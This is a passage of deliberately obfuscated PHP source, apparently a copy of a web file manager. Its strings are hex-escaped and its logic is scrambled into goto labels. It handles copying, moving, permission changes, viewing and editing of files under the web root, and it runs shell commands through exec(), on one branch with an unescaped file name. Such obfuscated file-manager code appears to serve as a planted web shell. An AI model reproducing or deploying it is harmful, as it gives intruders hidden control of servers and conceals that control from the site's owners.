$tr["\145\156"]["\x52\x65\x6e\x61\155\x65\x64\x20\x66\162\x6f\x6d"] = "\x52\145\x6e\141\155\x65\144\40\x66\x72\x6f\x6d"; $tr["\x65\x6e"]["\x41\162\143\x68\151\x76\145\40\156\157\164\40\165\156\x70\141\143\153\x65\x64"] = "\101\162\x63\x68\x69\166\145\x20\156\157\164\x20\165\x6e\x70\141\143\x6b\145\x64"; $tr["\x65\156"]["\x44\145\x6c\145\x74\x65\x64"] = "\x44\145\154\145\x74\145\144"; $tr["\x65\x6e"]["\x41\162\x63\150\151\166\145\x20\156\x6f\164\40\x63\x72\145\x61\x74\145\x64"] = "\x41\162\x63\x68\151\166\145\x20\156\157\x74\40\x63\162\x65\x61\x74\145\144"; $tr["\x65\x6e"]["\103\157\x70\151\145\x64\40\146\162\157\x6d"] = "\x43\x6f\x70\x69\x65\144\40\146\162\157\x6d"; $tr["\145\x6e"]["\x50\x65\x72\x6d\x69\163\x73\x69\x6f\156\163\40\x63\150\141\156\147\x65\144"] = "\120\x65\162\x6d\x69\163\x73\x69\x6f\x6e\163\40\143\150\141\156\147\145\144"; $tr["\x65\x6e"]["\164\157"] = "\x74\157"; $tr["\145\x6e"]["\123\x61\166\x65\x64\x20\x53\165\x63\x63\145\x73\163\x66\x75\x6c\x6c\171"] = "\x53\x61\166\x65\144\x20\123\x75\x63\143\145\x73\163\x66\165\154\x6c\171"; $tr["\x65\156"]["\156\x6f\x74\x20\x66\x6f\165\x6e\144\x21"] = "\x6e\x6f\164\x20\146\157\165\x6e\144\41"; $tr["\145\x6e"]["\x46\151\154\x65\x20\x53\141\166\145\x64\x20\x53\165\x63\x63\145\163\163\146\x75\x6c\x6c\171"] = "\x46\151\x6c\145\x20\123\x61\x76\x65\x64\x20\x53\x75\143\x63\x65\163\163\x66\x75\154\x6c\171"; $tr["\145\156"]["\101\x72\143\x68\x69\x76\145"] = "\101\x72\143\x68\x69\166\x65"; $tr["\145\x6e"]["\x50\145\162\155\151\163\x73\151\x6f\x6e\163\40\x6e\x6f\x74\x20\x63\150\x61\x6e\x67\145\144"] = "\120\x65\x72\x6d\x69\163\163\151\157\x6e\x73\x20\x6e\157\164\40\143\x68\141\x6e\x67\x65\144"; $tr["\145\156"]["\x53\x65\154\145\x63\164\x20\146\x6f\154\x64\x65\162"] = "\123\x65\x6c\x65\143\x74\40\146\157\x6c\144\x65\162"; $tr["\x65\156"]["\x53\x6f\x75\162\143\145\40\160\x61\164\x68\40\x6e\157\164\40\x64\145\x66\151\156\x65\144"] = "\x53\x6f\165\x72\143\x65\x20\x70\141\x74\150\40\x6e\157\x74\40\x64\x65\146\x69\x6e\x65\x64"; $tr["\x65\156"]["\x61\x6c\162\x65\x61\144\171\40\x65\170\151\163\x74\163"] = "\x61\x6c\x72\145\x61\144\x79\40\145\x78\x69\x73\164\163"; $tr["\x65\x6e"]["\105\x72\x72\157\x72\40\x77\150\151\x6c\145\40\x6d\157\166\x69\156\147\40\146\162\x6f\155"] = "\105\x72\x72\157\162\x20\x77\x68\151\154\x65\x20\155\x6f\x76\151\x6e\x67\x20\146\x72\157\x6d"; $tr["\145\156"]["\x43\x72\x65\x61\164\x65\x20\x61\162\x63\x68\151\166\145\x3f"] = "\x43\x72\145\141\x74\145\40\x61\162\143\x68\151\166\145\x3f"; $tr["\x65\156"]["\111\x6e\x76\141\154\x69\x64\40\x66\x69\x6c\x65\x20\x6f\162\40\x66\157\154\144\x65\162\x20\x6e\x61\x6d\x65"] = "\111\x6e\x76\141\154\151\x64\40\x66\151\x6c\145\40\x6f\162\40\x66\x6f\x6c\144\x65\162\40\156\x61\x6d\145"; $tr["\145\156"]["\x41\x72\143\x68\x69\x76\x65\x20\x75\x6e\160\141\x63\x6b\145\144"] = "\101\x72\x63\150\151\166\x65\x20\165\x6e\160\x61\x63\153\x65\x64"; $tr["\145\156"]["\x46\x69\154\145\40\145\170\x74\145\x6e\x73\x69\157\x6e\x20\151\163\x20\156\157\164\x20\x61\154\x6c\x6f\167\145\144"] = "\106\x69\154\x65\40\145\x78\x74\x65\156\163\x69\157\156\x20\151\163\40\156\157\x74\40\141\154\154\x6f\x77\145\144"; $tr["\145\x6e"]["\x52\x6f\157\164\x20\x70\x61\x74\150"] = "\122\x6f\157\164\40\160\x61\x74\150"; $tr["\x65\156"]["\x45\162\x72\x6f\162\40\x77\150\x69\x6c\145\x20\162\145\x6e\141\x6d\x69\156\147\40\x66\x72\x6f\155"] = "\x45\162\x72\157\162\x20\167\150\x69\x6c\145\x20\x72\x65\x6e\x61\155\151\156\147\40\146\x72\x6f\155"; $tr["\x65\x6e"]["\106\x69\x6c\145\40\156\157\x74\x20\146\157\x75\156\144"] = "\106\151\154\145\40\x6e\157\x74\40\x66\157\165\156\x64"; $tr["\x65\x6e"]["\105\x72\162\157\x72\x20\167\150\x69\x6c\x65\40\x64\x65\x6c\x65\x74\151\156\147\40\151\x74\145\155\x73"] = "\x45\162\x72\x6f\x72\x20\x77\150\151\154\x65\40\x64\145\x6c\x65\164\x69\156\147\x20\151\x74\145\155\x73"; $tr["\145\156"]["\111\x6e\x76\141\x6c\151\144\40\x63\150\x61\162\141\143\164\145\x72\x73\x20\x69\156\40\x66\x69\x6c\x65\40\156\x61\x6d\145"] = "\111\156\166\141\x6c\151\144\40\143\x68\141\x72\141\x63\164\x65\x72\x73\x20\x69\x6e\x20\146\151\x6c\x65\40\x6e\x61\155\145"; $tr["\x65\x6e"]["\106\x49\114\x45\40\x45\130\124\x45\116\x53\x49\x4f\x4e\40\110\101\123\40\116\117\124\x20\x53\x55\120\x50\117\122\124\x45\104"] = "\x46\x49\x4c\105\40\x45\130\124\105\116\123\x49\117\116\40\x48\101\x53\x20\x4e\117\x54\40\x53\x55\120\x50\x4f\x52\124\x45\104"; $tr["\145\x6e"]["\x53\x65\x6c\145\x63\x74\145\x64\40\x66\x69\x6c\x65\x73\40\141\x6e\x64\40\x66\x6f\154\144\145\x72\x20\144\145\154\x65\164\145\144"] = "\123\x65\x6c\x65\143\164\145\144\x20\x66\151\x6c\x65\163\40\x61\x6e\x64\40\146\157\154\x64\x65\x72\x20\144\x65\x6c\x65\x74\145\x64"; $tr["\x65\156"]["\x45\x72\162\x6f\x72\40\167\x68\x69\x6c\145\40\x66\x65\x74\143\150\x69\156\x67\40\141\x72\143\x68\151\x76\x65\x20\x69\x6e\x66\x6f"] = "\x45\x72\162\157\x72\40\x77\150\x69\154\x65\x20\x66\145\164\x63\x68\x69\x6e\147\40\x61\x72\x63\x68\x69\x76\x65\40\151\x6e\146\157"; $tr["\x65\x6e"]["\x44\145\154\145\164\145\40\x73\145\154\x65\x63\164\x65\144\40\146\x69\x6c\145\163\x20\141\x6e\x64\x20\x66\157\x6c\x64\x65\162\163\x3f"] = "\104\x65\154\145\164\x65\40\x73\x65\154\145\143\x74\x65\144\x20\x66\x69\x6c\x65\x73\x20\141\x6e\144\x20\146\157\x6c\x64\x65\x72\163\x3f"; $tr["\x65\156"]["\123\x65\141\x72\x63\150\x20\x66\x69\x6c\x65\x20\x69\x6e\40\x66\x6f\154\144\145\162\x20\141\x6e\x64\x20\163\x75\x62\x66\157\x6c\x64\145\162\x73\56\56\x2e"] = "\x53\145\141\162\143\150\x20\146\x69\154\145\40\151\156\x20\x66\x6f\154\x64\x65\162\40\x61\156\x64\40\x73\165\142\146\157\154\x64\145\162\x73\x2e\x2e\x2e"; $tr["\145\156"]["\x41\143\x63\x65\163\x73\40\144\x65\156\151\x65\144\x2e\40\111\x50\40\x72\x65\163\x74\x72\151\143\x74\x69\x6f\x6e\x20\x61\160\160\x6c\x69\143\x61\x62\154\x65"] = "\x41\x63\x63\145\x73\x73\x20\x64\x65\x6e\x69\145\144\56\x20\111\x50\40\x72\145\x73\164\162\x69\x63\164\x69\157\x6e\x20\141\x70\x70\154\x69\x63\x61\x62\154\145"; $tr["\x65\156"]["\x49\156\x76\x61\x6c\151\144\40\x63\150\141\162\141\x63\x74\x65\162\x73\40\x69\x6e\40\146\x69\154\145\x20\157\162\x20\146\x6f\x6c\144\145\162\x20\156\x61\155\145"] = "\111\156\x76\x61\x6c\x69\144\40\143\150\x61\162\141\x63\164\x65\162\163\40\151\156\x20\146\x69\154\x65\x20\157\x72\40\146\157\x6c\x64\145\162\x20\x6e\141\155\145"; $tr["\145\156"]["\x4f\160\145\162\141\164\x69\x6f\156\163\40\167\x69\164\x68\x20\x61\x72\143\x68\x69\166\x65\x73\40\141\x72\145\x20\x6e\157\x74\x20\141\166\141\151\x6c\141\142\154\x65"] = "\x4f\x70\x65\x72\141\x74\x69\157\x6e\x73\40\167\x69\164\x68\x20\x61\162\x63\150\151\166\145\x73\x20\141\162\145\40\x6e\x6f\164\x20\141\166\141\x69\x6c\141\142\154\145"; $tr["\145\156"]["\106\151\x6c\x65\40\157\x72\40\146\157\154\144\x65\162\40\167\151\164\x68\40\164\x68\x69\x73\x20\160\x61\164\150\x20\x61\154\162\x65\x61\144\x79\40\x65\170\x69\163\x74\163"] = "\x46\x69\154\145\x20\157\162\x20\x66\x6f\154\x64\145\162\x20\167\151\164\150\x20\164\150\151\x73\x20\160\141\x74\150\40\x61\154\162\x65\141\x64\171\x20\x65\x78\151\x73\164\163"; $tr["\145\156"]["\115\157\x76\145\144\x20\x66\162\x6f\x6d"] = "\x4d\157\166\145\144\x20\146\162\x6f\x6d"; $i18n = fm_get_translations($tr); $tr = $i18n ? $i18n : $tr; if (!strlen($lang)) { $lang = "\x65\x6e"; } if (isset($tr[$lang][$txt])) { return fm_enc($tr[$lang][$txt]); } else { if (isset($tr["\x65\x6e"][$txt])) { return fm_enc($tr["\145\156"][$txt]); } else { return "{$txt}"; } } } goto PaL1A; um99G: $root_path = $_SERVER["\104\117\x43\x55\x4d\x45\x4e\124\137\122\x4f\117\124"]; goto zUbuB; lSWBD: $http_host = $_SERVER["\x48\124\124\x50\137\110\x4f\123\x54"]; goto V4n1f; tMIAQ: define("\x46\x4d\137\105\104\x49\124\x5f\x46\x49\114\x45", $edit_files); goto g6FZw; U2Cqd: if (isset($_GET["\143\x6f\x70\x79"], $_GET["\x66\151\x6e\151\x73\150"]) && !FM_READONLY) { $copy = $_GET["\x63\x6f\x70\x79"]; $copy = fm_clean_path($copy); if ($copy == '') { fm_set_msg(lng("\x53\157\165\x72\x63\x65\40\x70\x61\164\x68\40\x6e\157\164\40\144\145\146\151\156\x65\144"), "\x65\162\x72\157\162"); fm_redirect(FM_SELF_URL . "\x3f\x70\x3d" . urlencode(FM_PATH)); } $from = FM_ROOT_PATH . "\57" . $copy; $dest = FM_ROOT_PATH; if (FM_PATH != '') { $dest .= "\x2f" . FM_PATH; } $dest .= "\57" . basename($from); $move = isset($_GET["\155\x6f\166\145"]); if ($from != $dest) { $msg_from = trim(FM_PATH . "\57" . basename($from), "\57"); if ($move) { $rename = fm_rename($from, $dest); if ($rename) { fm_set_msg(sprintf(lng("\115\x6f\x76\145\144\40\146\x72\x6f\x6d") . "\40\74\142\x3e\45\163\74\x2f\x62\76\x20" . lng("\x74\157") . "\40\74\x62\x3e\45\163\x3c\x2f\142\76", fm_enc($copy), fm_enc($msg_from))); } elseif ($rename === null) { fm_set_msg(lng("\x46\151\154\x65\x20\157\x72\x20\x66\157\154\x64\145\x72\x20\x77\x69\164\150\x20\x74\x68\x69\163\40\x70\x61\164\150\x20\x61\154\x72\145\141\x64\171\x20\145\x78\x69\163\x74\163"), "\141\x6c\145\162\x74"); } else { fm_set_msg(sprintf(lng("\x45\162\x72\157\x72\40\167\x68\x69\154\145\40\155\157\166\151\156\x67\40\x66\162\157\x6d") . "\40\74\x62\76\x25\163\74\x2f\x62\x3e\x20" . lng("\164\x6f") . "\40\x3c\x62\76\45\x73\74\57\142\76", fm_enc($copy), fm_enc($msg_from)), "\x65\162\x72\157\162"); } } else { if (fm_rcopy($from, $dest)) { fm_set_msg(sprintf(lng("\x43\157\160\x69\x65\x64\x20\146\x72\157\x6d") . "\x20\x3c\142\76\45\163\74\x2f\x62\76\40" . lng("\164\157") . "\40\x3c\142\x3e\45\163\74\x2f\x62\x3e", fm_enc($copy), fm_enc($msg_from))); } else { fm_set_msg(sprintf(lng("\x45\162\x72\157\162\x20\x77\150\x69\x6c\145\40\x63\157\160\171\151\156\x67\40\x66\162\157\x6d") . "\x20\74\142\76\x25\163\74\57\x62\76\x20" . lng("\164\x6f") . "\40\74\x62\76\45\163\x3c\57\142\76", fm_enc($copy), fm_enc($msg_from)), "\x65\162\x72\x6f\162"); } } } else { if (!$move) { $msg_from = trim(FM_PATH . "\57" . basename($from), "\57"); $fn_parts = pathinfo($from); $extension_suffix = ''; if (!is_dir($from)) { $extension_suffix = "\x2e" . $fn_parts["\145\170\164\145\x6e\x73\151\157\x6e"]; } $fn_duplicate = $fn_parts["\x64\x69\x72\x6e\141\x6d\145"] . "\x2f" . $fn_parts["\146\x69\154\x65\156\141\x6d\145"] . "\55" . date("\x59\x6d\144\x48\x69\163") . $extension_suffix; $loop_count = 0; $max_loop = 1000; while (file_exists($fn_duplicate) & $loop_count < $max_loop) { $fn_parts = pathinfo($fn_duplicate); $fn_duplicate = $fn_parts["\144\151\x72\156\x61\x6d\145"] . "\57" . $fn_parts["\146\x69\x6c\x65\156\141\x6d\x65"] . "\x2d\x63\x6f\160\171" . $extension_suffix; $loop_count++; } if (fm_rcopy($from, $fn_duplicate, False)) { fm_set_msg(sprintf("\x43\157\x70\x79\151\x65\144\x20\146\162\x6f\x6d\x20\74\x62\x3e\x25\x73\74\57\x62\x3e\x20\x74\x6f\40\74\142\76\x25\x73\74\57\142\x3e", fm_enc($copy), fm_enc($fn_duplicate))); } else { fm_set_msg(sprintf("\x45\x72\162\x6f\162\40\x77\150\x69\x6c\x65\40\143\157\160\171\x69\156\147\40\146\162\157\x6d\40\74\142\x3e\45\x73\74\x2f\x62\x3e\40\x74\157\40\74\x62\76\x25\x73\x3c\57\x62\76", fm_enc($copy), fm_enc($fn_duplicate)), "\145\162\162\x6f\x72"); } } else { fm_set_msg(lng("\x50\x61\164\x68\163\x20\x6d\165\x73\164\x20\x62\x65\40\x6e\x6f\164\x20\x65\x71\165\141\x6c"), "\141\154\x65\162\x74"); } } fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } goto uPljZ; AOLMn: $config_file = __DIR__ . "\57\143\157\x6e\x66\151\x67\56\160\150\x70"; goto r5oY5; LCyks: if (isset($_POST["\x63\x68\x6d\157\144"]) && !FM_READONLY && !FM_IS_WIN) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $file = $_POST["\x63\150\x6d\x6f\144"]; $file = fm_clean_path($file); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file) && !is_dir($path . "\57" . $file)) { fm_set_msg(lng("\106\151\x6c\145\40\156\157\x74\40\146\x6f\165\x6e\x64"), "\x65\x72\x72\x6f\x72"); fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } $mode = 0; if (!empty($_POST["\x75\162"])) { $mode |= 256; } if (!empty($_POST["\165\167"])) { $mode |= 128; } if (!empty($_POST["\x75\170"])) { $mode |= 64; } if (!empty($_POST["\147\162"])) { $mode |= 32; } if (!empty($_POST["\x67\167"])) { $mode |= 16; } if (!empty($_POST["\147\x78"])) { $mode |= 8; } if (!empty($_POST["\x6f\x72"])) { $mode |= 4; } if (!empty($_POST["\157\167"])) { $mode |= 2; } if (!empty($_POST["\x6f\x78"])) { $mode |= 1; } if (@chmod($path . "\57" . $file, $mode)) { fm_set_msg(lng("\x50\145\162\155\151\163\x73\x69\x6f\x6e\x73\40\x63\150\141\x6e\147\x65\144")); } else { fm_set_msg(lng("\x50\145\162\x6d\151\x73\163\151\157\x6e\x73\x20\156\157\x74\x20\143\150\141\156\147\x65\x64"), "\145\162\x72\157\162"); } fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } goto ByJIc; MpdJd: $p = isset($_GET["\x70"]) ? $_GET["\x70"] : (isset($_POST["\x70"]) ? $_POST["\160"] : ''); goto oeTfC; hh3pB: function fm_is_exclude_items($file) { $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); if (isset($exclude_items) and sizeof($exclude_items)) { unset($exclude_items); } $exclude_items = FM_EXCLUDE_ITEMS; if (version_compare(PHP_VERSION, "\x37\56\x30\x2e\x30", "\x3c")) { $exclude_items = unserialize($exclude_items); } if (!in_array($file, $exclude_items) && !in_array("\x2a\56{$ext}", $exclude_items)) { return true; } return false; } goto di2vM; uo76i: if (isset($_GET["\143\157\x70\171"]) && !isset($_GET["\x66\151\x6e\x69\x73\x68"]) && !FM_READONLY) { $copy = $_GET["\x63\157\160\x79"]; $copy = fm_clean_path($copy); if ($copy == '' || !file_exists(FM_ROOT_PATH . "\57" . $copy)) { fm_set_msg(lng("\106\151\x6c\145\x20\x6e\157\x74\x20\x66\157\165\x6e\x64"), "\145\x72\x72\157\x72"); fm_redirect(FM_SELF_URL . "\x3f\x70\x3d" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            Source path: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\57" . $copy)); ?>
<br>
            Destination folder: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2f" . FM_PATH)); ?>
        </p>
        <p>
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i><?php  echo lng("\x53\145\x6c\x65\x63\164\40\x66\157\x6c\x64\145\x72"); ?>
</i></p>
        <ul class="folders break-word">
            <?php  if ($parent !== false) { ?>
                <li><a href="?p=<?php  echo urlencode($parent); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php  } foreach ($folders as $f) { ?>
                <li>
                    <a href="?p=<?php  echo urlencode(trim(FM_PATH . "\57" . $f, "\x2f")); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-folder-o"></i> <?php  echo fm_convert_win($f); ?>
</a></li>
                <?php  } ?>
        </ul>
    </div>
    <?php  fm_show_footer(); die; } goto ZdAij; Owes3: function fm_mkdir($dir, $force) { if (file_exists($dir)) { if (is_dir($dir)) { return $dir; } elseif (!$force) { return false; } unlink($dir); } return mkdir($dir, 511, true); } goto PwXgS; KFtem: function fm_get_size($file) { static $iswin; static $isdarwin; if (!isset($iswin)) { $iswin = strtoupper(substr(PHP_OS, 0, 3)) == "\x57\x49\116"; } if (!isset($isdarwin)) { $isdarwin = strtoupper(substr(PHP_OS, 0)) == "\x44\x41\122\x57\x49\116"; } static $exec_works; if (!isset($exec_works)) { $exec_works = function_exists("\145\170\x65\143") && !ini_get("\163\141\x66\x65\x5f\155\x6f\144\x65") && @exec("\145\x63\x68\x6f\x20\105\x58\x45\x43") == "\105\x58\105\x43"; } if ($exec_works) { $arg = escapeshellarg($file); $cmd = $iswin ? "\x66\157\162\40\x25\x46\x20\151\x6e\x20\50\42{$file}\42\x29\x20\x64\157\x20\x40\x65\x63\x68\x6f\40\x25\x7e\x7a\x46" : ($isdarwin ? "\163\x74\141\x74\x20\55\x66\45\172\x20{$arg}" : "\163\164\x61\x74\40\x2d\x63\x25\x73\40{$arg}"); @exec($cmd, $output); if (is_array($output) && ctype_digit($size = trim(implode("\xa", $output)))) { return $size; } } if ($iswin && class_exists("\x43\117\x4d")) { try { $fsobj = new COM("\x53\x63\162\151\x70\164\x69\156\147\x2e\x46\151\154\x65\123\x79\x73\164\145\x6d\x4f\142\x6a\145\x63\x74"); $f = $fsobj->GetFile(realpath($file)); $size = $f->Size; } catch (Exception $e) { $size = null; } if (ctype_digit($size)) { return $size; } } return filesize($file); } goto fCFub; SUwTn: $CONFIG = "\x7b\x22\x6c\141\x6e\147\42\72\42\145\x6e\42\x2c\42\145\162\x72\157\x72\x5f\x72\x65\160\157\162\164\x69\156\x67\x22\72\146\141\154\x73\x65\54\42\x73\150\157\x77\x5f\x68\151\144\144\x65\x6e\42\x3a\x66\141\x6c\163\145\54\42\150\x69\144\x65\x5f\103\157\154\x73\42\72\146\x61\x6c\x73\x65\54\x22\143\141\x6c\143\137\146\x6f\154\144\145\x72\x22\72\146\x61\154\163\x65\x2c\x22\x74\x68\145\x6d\145\42\x3a\42\154\151\x67\150\x74\x22\x7d"; goto lT1Yk; kKT8i: define("\x4d\101\x58\137\125\x50\x4c\x4f\x41\104\x5f\123\111\x5a\x45", $max_upload_size_bytes); goto T5KaI; kPf7e: $folders = array(); goto Uy8A2; NVoJj: function fm_get_image_exts() { return array("\151\x63\157", "\x67\151\146", "\152\160\147", "\x6a\x70\145\x67", "\x6a\160\x63", "\152\160\62", "\x6a\x70\170", "\x78\142\155", "\x77\x62\x6d\x70", "\x70\x6e\147", "\142\155\160", "\x74\151\x66", "\164\151\146\146", "\160\x73\144", "\163\x76\x67", "\x77\145\x62\160", "\141\166\x69\146"); } goto z4C0M; wWfT4: $favicon_path = ''; goto ERigN; xp1sz: function fm_rchmod($path, $filemode, $dirmode) { if (is_dir($path)) { if (!chmod($path, $dirmode)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\56\56") { if (!fm_rchmod($path . "\x2f" . $file, $filemode, $dirmode)) { return false; } } } } return true; } elseif (is_link($path)) { return true; } elseif (is_file($path)) { return chmod($path, $filemode); } return false; } goto JuO9B; JMxlX: function fm_isvalid_filename($text) { return strpbrk($text, "\57\x3f\x25\x2a\72\x7c\x22\74\76") === FALSE ? true : false; } goto L8CJK; GyNAs: if (isset($_SESSION[FM_SESSION_ID]["\154\157\x67\147\145\144"]) && !empty($directories_users[$_SESSION[FM_SESSION_ID]["\x6c\x6f\147\x67\145\x64"]])) { $wd = fm_clean_path(dirname($_SERVER["\120\x48\x50\x5f\123\x45\114\x46"])); $root_url = $root_url . $wd . DIRECTORY_SEPARATOR . $directories_users[$_SESSION[FM_SESSION_ID]["\154\157\147\147\x65\x64"]]; } goto KL0_4; x_iMx: if (isset($_GET["\x76\151\x65\x77"])) { $file = $_GET["\x76\x69\145\167"]; $quickView = isset($_GET["\x71\165\151\143\x6b\126\151\145\x77"]) && $_GET["\161\165\151\x63\x6b\x56\x69\145\167"] == 1 ? true : false; $file = fm_clean_path($file, false); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\57" . $file) || in_array($file, $GLOBALS["\145\170\143\x6c\x75\x64\145\x5f\151\x74\x65\x6d\163"])) { fm_set_msg(lng("\x46\x69\x6c\145\x20\x6e\x6f\x74\40\x66\x6f\x75\x6e\x64"), "\145\x72\162\x6f\162"); fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } if (!$quickView) { fm_show_header(); fm_show_nav_path(FM_PATH); } $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? "\x2f" . FM_PATH : '') . "\57" . $file); $file_path = $path . "\57" . $file; $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = fm_get_mime_type($file_path); $filesize_raw = fm_get_size($file_path); $filesize = fm_get_filesize($filesize_raw); $is_zip = false; $is_gzip = false; $is_image = false; $is_audio = false; $is_video = false; $is_text = false; $is_onlineViewer = false; $view_title = "\x46\151\154\145"; $filenames = false; $content = ''; $online_viewer = strtolower(FM_DOC_VIEWER); if ($online_viewer && $online_viewer !== "\x66\x61\x6c\163\145" && in_array($ext, fm_get_onlineViewer_exts())) { $is_onlineViewer = true; } elseif ($ext == "\x7a\151\x70" || $ext == "\x74\x61\162") { $is_zip = true; $view_title = "\x41\162\x63\x68\151\x76\x65"; $filenames = fm_get_zif_info($file_path, $ext); } elseif (in_array($ext, fm_get_image_exts())) { $is_image = true; $view_title = "\111\155\141\x67\145"; } elseif (in_array($ext, fm_get_audio_exts())) { $is_audio = true; $view_title = "\x41\x75\144\151\x6f"; } elseif (in_array($ext, fm_get_video_exts())) { $is_video = true; $view_title = "\x56\151\144\x65\157"; } elseif (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\164\145\170\x74" || in_array($mime_type, fm_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="row">
        <div class="col-12">
            <?php  if (!$quickView) { ?>
                <p class="break-word"><b><?php  echo $view_title; ?>
 "<?php  echo fm_enc(fm_convert_win($file)); ?>
"</b></p>
                <p class="break-word">
                    Full path: <?php  echo fm_enc(fm_convert_win($file_path)); ?>
<br>
                    File size: <?php  echo $filesize_raw <= 1000 ? "{$filesize_raw}\40\142\171\x74\145\163" : $filesize; ?>
<br>
                    MIME-type: <?php  echo $mime_type; ?>
<br>
                    <?php  if (($is_zip || $is_gzip) && $filenames !== false) { $total_files = 0; $total_comp = 0; $total_uncomp = 0; foreach ($filenames as $fn) { if (!$fn["\x66\157\x6c\x64\x65\x72"]) { $total_files++; } $total_comp += $fn["\143\x6f\155\160\162\x65\x73\163\145\x64\137\x73\x69\172\145"]; $total_uncomp += $fn["\146\x69\x6c\145\x73\x69\x7a\145"]; } ?>
                        Files in archive: <?php  echo $total_files; ?>
<br>
                        Total size: <?php  echo fm_get_filesize($total_uncomp); ?>
<br>
                        Size in archive: <?php  echo fm_get_filesize($total_comp); ?>
<br>
                        Compression: <?php  echo round($total_comp / $total_uncomp * 100); ?>
%<br>
                        <?php  } if ($is_image) { $image_size = getimagesize($file_path); echo "\x49\155\x61\x67\x65\40\163\x69\172\145\x73\x3a\40" . (isset($image_size[0]) ? $image_size[0] : "\60") . "\40\170\x20" . (isset($image_size[1]) ? $image_size[1] : "\x30") . "\74\x62\162\x3e"; } if ($is_text) { $is_utf8 = fm_is_utf8($content); if (function_exists("\151\x63\x6f\x6e\x76")) { if (!$is_utf8) { $content = iconv(FM_ICONV_INPUT_ENC, "\x55\124\x46\55\x38\57\x2f\111\x47\116\x4f\x52\x45", $content); } } echo "\103\x68\141\x72\163\145\x74\72\x20" . ($is_utf8 ? "\165\164\x66\55\x38" : "\70\x20\142\151\x74") . "\x3c\142\x72\76"; } ?>
                </p>
                <p>
                    <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;dl=<?php  echo urlencode($file); ?>
"><i class="fa fa-cloud-download"></i> <?php  echo lng("\104\x6f\167\x6e\154\x6f\141\x64"); ?>
</a></b> &nbsp;
                    <b><a href="<?php  echo fm_enc($file_url); ?>
" target="_blank"><i class="fa fa-external-link-square"></i> <?php  echo lng("\117\x70\x65\156"); ?>
</a></b>
                    &nbsp;
                    <?php  if (!FM_READONLY && ($is_zip || $is_gzip) && $filenames !== false) { $zip_name = pathinfo($file_path, PATHINFO_FILENAME); ?>
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
"><i class="fa fa-check-circle"></i> <?php  echo lng("\x55\156\132\x69\160"); ?>
</a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
&amp;tofolder=1" title="UnZip to <?php  echo fm_enc($zip_name); ?>
"><i class="fa fa-check-circle"></i>
                                <?php  echo lng("\x55\x6e\x5a\151\160\124\x6f\x46\x6f\154\144\x65\162"); ?>
</a></b> &nbsp;
                        <?php  } if ($is_text && !FM_READONLY) { ?>
                        <b><a href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
" class="edit-file"><i class="fa fa-pencil-square"></i> <?php  echo lng("\x45\x64\x69\164"); ?>
                            </a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&env=ace"
                              class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\x41\x64\x76\x61\x6e\143\145\144\x45\144\x69\x74\157\x72"); ?>
                            </a></b> &nbsp;
                    <?php  } ?>
                    <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\x42\x61\x63\153"); ?>
</a></b>
                </p>
                <?php  } if ($is_onlineViewer) { if ($online_viewer == "\147\157\157\147\x6c\x65") { echo "\74\x69\x66\162\x61\x6d\x65\x20\x73\162\x63\75\x22\x68\x74\164\160\163\72\57\x2f\144\x6f\143\163\56\147\x6f\157\x67\x6c\145\56\143\x6f\155\x2f\166\151\145\x77\145\x72\77\x65\155\142\x65\144\x64\x65\144\x3d\164\x72\x75\x65\x26\150\x6c\x3d\145\156\x26\165\162\x6c\75" . fm_enc($file_url) . "\42\40\146\x72\141\155\145\x62\x6f\162\144\145\x72\75\x22\156\x6f\x22\x20\163\164\x79\154\145\75\x22\167\x69\144\x74\150\x3a\61\x30\x30\45\x3b\x6d\x69\x6e\55\x68\145\151\147\150\164\x3a\x34\x36\60\160\170\x22\x3e\74\x2f\151\146\162\141\x6d\145\x3e"; } else { if ($online_viewer == "\x6d\151\143\x72\x6f\x73\x6f\146\x74") { echo 